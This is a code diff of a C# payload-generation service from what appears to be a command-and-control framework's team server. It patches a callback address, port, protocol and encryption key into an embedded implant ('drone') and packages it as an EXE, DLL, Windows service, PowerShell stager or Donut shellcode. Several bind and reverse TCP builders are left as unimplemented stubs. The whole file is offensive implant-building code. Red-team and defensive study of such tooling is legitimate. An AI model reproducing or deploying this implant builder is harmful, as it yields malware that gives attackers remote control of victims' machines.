@@ -1,8 +1,6 @@
-﻿using System.Reflection;
-using System.Text;
+﻿using System.Text;
 
 using dnlib.DotNet;
-using dnlib.DotNet.Emit;
 using dnlib.DotNet.Writer;
 using dnlib.PE;
 
@@ -26,161 +24,142 @@ public class PayloadService : IPayloadService
 
     public async Task<byte[]> GeneratePayload(Handler handler, PayloadFormat format)
     {
+        byte[] drone;
+
+        // generate the assembly
         switch (handler.PayloadType)
         {
             case PayloadType.REVERSE_HTTP:
             {
                 var httpHandler = (HttpHandler)handler;
-                return await GenerateHttpPayload(httpHandler.ConnectAddress, httpHandler.ConnectPort,
-                    httpHandler.Secure, format);
+                drone = await GenerateHttpDrone(httpHandler.ConnectAddress, httpHandler.ConnectPort);
+                
+                break;
             }
 
             case PayloadType.REVERSE_HTTPS:
             {
-                var httpHandler = (HttpHandler)handler;
-                return await GenerateHttpPayload(httpHandler.ConnectAddress, httpHandler.ConnectPort, httpHandler.Secure, format);
+                var httpsHandler = (HttpHandler)handler;
+                drone = await GenerateHttpsDrone(httpsHandler.ConnectAddress, httpsHandler.ConnectPort);
+                
+                break;
             }
 
             case PayloadType.BIND_PIPE:
             {
                 var smbHandler = (SmbHandler)handler;
-                return await GenerateBindSmbPayload(smbHandler.PipeName, format);
+                drone = await GenerateBindSmbDrone(smbHandler.PipeName);
+                
+                break;
             }
 
             case PayloadType.BIND_TCP:
             {
-                var tcpHandler = (TcpHandler)handler;
-                return await GenerateBindTcpPayload(tcpHandler.BindPort, tcpHandler.LoopbackOnly, format);
+                var bindTcpHandler = (TcpHandler)handler;
+                drone = await GenerateBindTcpDrone(bindTcpHandler.Port);
+                
+                break;
+            }
+
+            case PayloadType.REVERSE_TCP:
+            {
+                var reverseTcpHandler = (TcpHandler)handler;
+                drone = await GenerateReverseTcpDrone(reverseTcpHandler.Address, reverseTcpHandler.Port);
+                
+                break;
             }
             
-            case PayloadType.REVERSE_TCP:
-                throw new NotImplementedException();
-            
-            case PayloadType.CUSTOM:
+            case PayloadType.EXTERNAL:
                 throw new NotImplementedException();
             
             default:
                 throw new ArgumentOutOfRangeException();
         }
+        
+        // convert to correct format
+        return format switch
+        {
+            PayloadFormat.EXE => await BuildExe(drone),
+            PayloadFormat.DLL => BuildDll(drone),
+            PayloadFormat.SVC_EXE => await BuildServiceExe(drone),
+            PayloadFormat.POWERSHELL => await BuildPowerShellScript(drone),
+            PayloadFormat.SHELLCODE => await BuildShellcode(drone),
+            
+            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
+        };
     }
 
-    public async Task<byte[]> GenerateHttpPayload(string connectAddress, int connectPort, bool secure, PayloadFormat format)
+    private async Task<byte[]> GenerateHttpDrone(string connectAddress, int connectPort)
     {
-        var droneModule = await GetDroneModule();
+        var drone = await GetDroneModule();
         
         // get the http handler
-        var httpHandlerDef = droneModule.GetTypeDef("Drone.Handlers.HttpHandler");
+        var httpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.HttpCommModule");
+        
+        // set schema
+        var schemaDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_Schema()");
+        schemaDef.Body.Instructions[0].Operand = "http";
         
         // set connect address
-        var connectAddressDef = httpHandlerDef.GetMethodDef("System.String Drone.Handlers.HttpHandler::get_ConnectAddress()");
-
-        var address = secure ? "https://" : "http://";
-        address += connectAddress;
-        
-        connectAddressDef.Body.Instructions[0].Operand = address;
+        var connectAddressDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectAddress()");
+        connectAddressDef.Body.Instructions[0].Operand = connectAddress;
         
         // set connect port
-        var connectPortDef = httpHandlerDef.GetMethodDef("System.String Drone.Handlers.HttpHandler::get_ConnectPort()");
+        var connectPortDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectPort()");
         connectPortDef.Body.Instructions[0].Operand = connectPort.ToString();
-
-        await using var ms = new MemoryStream();
-        droneModule.Write(ms);
-
-        var drone = ms.ToArray();
-
-        return format switch
-        {
-            PayloadFormat.Exe => await BuildExe(drone),
-            PayloadFormat.Dll => BuildDll(drone),
-            PayloadFormat.ServiceExe => await BuildServiceExe(drone),
-            PayloadFormat.PowerShell => await BuildPowerShellScript(drone),
-            PayloadFormat.Shellcode => await BuildShellcode(drone),
-            
-            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
-        };
-    }
-
-    public async Task<byte[]> GenerateBindTcpPayload(int bindPort, bool loopbackOnly, PayloadFormat format)
-    {
-        var droneModule = await GetDroneModule();
-        
-        // get the tcp handler
-        var tcpHandlerDef = droneModule.GetTypeDef("Drone.Handlers.TcpHandler");
-        
-        // set the bind port
-        var bindPortDef = tcpHandlerDef.GetMethodDef("System.Int32 Drone.Handlers.TcpHandler::get_BindPort()");
-        bindPortDef.Body.Instructions[0].Operand = bindPort.ToString();
-        
-        // set the bind address
-        var loopbackDef = tcpHandlerDef.GetMethodDef("System.Boolean Drone.Handlers.TcpHandler::get_LoopbackOnly()");
-        loopbackDef.Body.Instructions[0].OpCode = loopbackOnly ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
-        
-        // get drone class
-        var droneDef = droneModule.GetTypeDef("Drone.Drone");
-        
-        // set handler ctor
-        var getHandlerDef = droneDef.GetMethodDef("Drone.Handlers.Handler Drone.Drone::GetHandler()");
-        var tcpHandlerCtor = tcpHandlerDef.GetMethodDef("System.Void Drone.Handlers.TcpHandler::.ctor()");
-        getHandlerDef.Body.Instructions[0].Operand = tcpHandlerCtor;
         
         await using var ms = new MemoryStream();
-        droneModule.Write(ms);
+        drone.Write(ms);
 
-        var drone = ms.ToArray();
-        
-        return format switch
-        {
-            PayloadFormat.Exe => await BuildExe(drone),
-            PayloadFormat.Dll => BuildDll(drone),
-            PayloadFormat.ServiceExe => await BuildServiceExe(drone),
-            PayloadFormat.PowerShell => await BuildPowerShellScript(drone),
-            PayloadFormat.Shellcode => await BuildShellcode(drone),
-            
-            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
-        };
+        return ms.ToArray();
     }
-
-    public async Task<byte[]> GenerateBindSmbPayload(string pipeName, PayloadFormat format)
+    
+    private async Task<byte[]> GenerateHttpsDrone(string connectAddress, int connectPort)
     {
-        var droneModule = await GetDroneModule();
+        var drone = await GetDroneModule();
         
-        // get the smb handler
-        var smbHandlerDef = droneModule.GetTypeDef("Drone.Handlers.SmbHandler");
+        // get the http handler
+        var httpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.HttpCommModule");
         
-        // set the pipe name
-        var pipeNameDef = smbHandlerDef.GetMethodDef("System.String Drone.Handlers.SmbHandler::get_PipeName()");
-        pipeNameDef.Body.Instructions[0].Operand = pipeName;
+        // set schema
+        var schemaDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_Schema()");
+        schemaDef.Body.Instructions[0].Operand = "https";
         
-        // get drone class
-        var droneDef = droneModule.GetTypeDef("Drone.Drone");
+        // set connect address
+        var connectAddressDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectAddress()");
+        connectAddressDef.Body.Instructions[0].Operand = connectAddress;
         
-        // set handler ctor
-        var getHandlerDef = droneDef.GetMethodDef("Drone.Handlers.Handler Drone.Drone::GetHandler()");
-        var smbHandlerCtor = smbHandlerDef.GetMethodDef("System.Void Drone.Handlers.SmbHandler::.ctor()");
-        getHandlerDef.Body.Instructions[0].Operand = smbHandlerCtor;
+        // set connect port
+        var connectPortDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectPort()");
+        connectPortDef.Body.Instructions[0].Operand = connectPort.ToString();
         
         await using var ms = new MemoryStream();
-        droneModule.Write(ms);
+        drone.Write(ms);
 
-        var drone = ms.ToArray();
-        
-        return format switch
-        {
-            PayloadFormat.Exe => await BuildExe(drone),
-            PayloadFormat.Dll => BuildDll(drone),
-            PayloadFormat.ServiceExe => await BuildServiceExe(drone),
-            PayloadFormat.PowerShell => await BuildPowerShellScript(drone),
-            PayloadFormat.Shellcode => await BuildShellcode(drone),
-            
-            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
-        };
+        return ms.ToArray();
     }
 
-    private static async Task<byte[]> BuildExe(byte[] payload)
+    private async Task<byte[]> GenerateBindSmbDrone(string pipeName)
     {
-        var stager = await GetEmbeddedResource("exe_stager.exe");
+        throw new NotImplementedException();
+    }
+
+    private async Task<byte[]> GenerateBindTcpDrone(int bindPort)
+    {
+        throw new NotImplementedException();
+    }
+
+    private async Task<byte[]> GenerateReverseTcpDrone(string connectAddress, int connectPort)
+    {
+        throw new NotImplementedException();
+    }
+
+    private static async Task<byte[]> BuildExe(byte[] drone)
+    {
+        var stager = await Helpers.GetEmbeddedResource("exe_stager.exe");
+        
         var module = ModuleDefMD.Load(stager);
-        module.Resources.Add(new EmbeddedResource("drone", payload));
+        module.Resources.Add(new EmbeddedResource("drone", drone));
         module.Name = "drone.exe";
 
         using var ms = new MemoryStream();
@@ -188,14 +167,14 @@ public class PayloadService : IPayloadService
 
         return ms.ToArray();
     }
-
-    private static byte[] BuildDll(byte[] payload)
+    
+    private static byte[] BuildDll(byte[] drone)
     {
-        var module = ModuleDefMD.Load(payload);
+        var module = ModuleDefMD.Load(drone);
         module.Name = "drone.dll";
         
-        var programDef = module.GetTypeDef("Drone.Program");
-        var execDef = programDef.GetMethodDef("System.Void Drone.Program::Execute()");
+        var programDef = GetTypeDef(module, "Drone.Program");
+        var execDef = GetMethodDef(programDef, "System.Threading.Tasks.Task Drone.Program::Execute()");
 
         // add unmanaged export
         execDef.ExportInfo = new MethodExportInfo();
@@ -218,11 +197,12 @@ public class PayloadService : IPayloadService
 
         return ms.ToArray();
     }
-
-    private static async Task<byte[]> BuildServiceExe(byte[] payload)
+    
+    private static async Task<byte[]> BuildServiceExe(byte[] drone)
     {
-        var shellcode = await BuildShellcode(payload);
-        var stager = await GetEmbeddedResource("svc_stager.exe");
+        var shellcode = await BuildShellcode(drone);
+        var stager = await Helpers.GetEmbeddedResource("svc_stager.exe");
+        
         var module = ModuleDefMD.Load(stager);
         module.Resources.Add(new EmbeddedResource("drone", shellcode));
         module.Name = "drone_svc.exe";
@@ -232,14 +212,14 @@ public class PayloadService : IPayloadService
 
         return ms.ToArray();
     }
-
-    private static async Task<byte[]> BuildPowerShellScript(byte[] payload)
+    
+    private static async Task<byte[]> BuildPowerShellScript(byte[] drone)
     {
         // build exe
-        var exe = await BuildExe(payload);
+        var exe = await BuildExe(drone);
         
         // get stager ps1
-        var stager = await GetEmbeddedResource("stager.ps1");
+        var stager = await Helpers.GetEmbeddedResource("stager.ps1");
         var stagerText = Encoding.ASCII.GetString(stager);
 
         // insert exe
@@ -251,13 +231,13 @@ public class PayloadService : IPayloadService
         return Encoding.ASCII.GetBytes(stagerText);
     }
 
-    private static async Task<byte[]> BuildShellcode(byte[] payload)
+    private static async Task<byte[]> BuildShellcode(byte[] drone)
     {
         var tmpShellcodePath = Path.GetTempFileName().Replace(".tmp", ".bin");
         var tmpPayloadPath = Path.GetTempFileName().Replace(".tmp", ".exe");
         
         // write drone to disk
-        await File.WriteAllBytesAsync(tmpPayloadPath, payload);
+        await File.WriteAllBytesAsync(tmpPayloadPath, drone);
         
         // donut config
         var config = new DonutConfig
@@ -282,33 +262,29 @@ public class PayloadService : IPayloadService
 
         return shellcode;
     }
-
+    
     private async Task<ModuleDef> GetDroneModule()
     {
-        var bytes = await GetEmbeddedResource("drone.dll");
+        var bytes = await Helpers.GetEmbeddedResource("drone.dll");
         var module = ModuleDefMD.Load(bytes);
 
         // write in crypto key
         var key = await _crypto.GetKey();
 
-        var cryptoClass = module.GetTypeDef("Drone.Crypto");
-        var keyMethod = cryptoClass.GetMethodDef("System.Byte[] Drone.Crypto::get_Key()");
+        var cryptoClass = GetTypeDef(module,"Drone.Utilities.Crypto");
+        var keyMethod = GetMethodDef(cryptoClass, "System.Byte[] Drone.Utilities.Crypto::get_Key()");
         keyMethod.Body.Instructions[0].Operand = Convert.ToBase64String(key);
 
         return module;
     }
-
-    private static async Task<byte[]> GetEmbeddedResource(string name)
+    
+    private static TypeDef GetTypeDef(ModuleDef module, string name)
     {
-        var self = Assembly.GetExecutingAssembly();
-        await using var rs = self.GetManifestResourceStream($"TeamServer.Resources.{name}");
-
-        if (rs is null)
-            return Array.Empty<byte>();
-
-        await using var ms = new MemoryStream();
-        await rs.CopyToAsync(ms);
-
-        return ms.ToArray();
+        return module.Types.Single(t => t.FullName.Equals(name, StringComparison.OrdinalIgnoreCase));
+    }
+    
+    private static MethodDef GetMethodDef(TypeDef type, string name)
+    {
+        return type.Methods.Single(m => m.FullName.Equals(name, StringComparison.OrdinalIgnoreCase));
     }
 }
